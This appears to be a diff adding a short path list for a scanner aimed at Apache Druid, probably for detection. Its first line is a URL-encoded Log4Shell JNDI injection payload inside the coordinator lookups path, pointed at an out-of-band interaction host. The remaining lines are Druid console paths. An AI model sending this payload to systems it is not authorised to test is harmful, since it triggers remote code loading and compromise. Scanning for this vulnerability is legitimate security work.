@@ -1,0 +1,4 @@
+/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{interactsh-url}}%2ftea%7d
+/unified-console.html
+/druid/index.html
+/druid/login.html
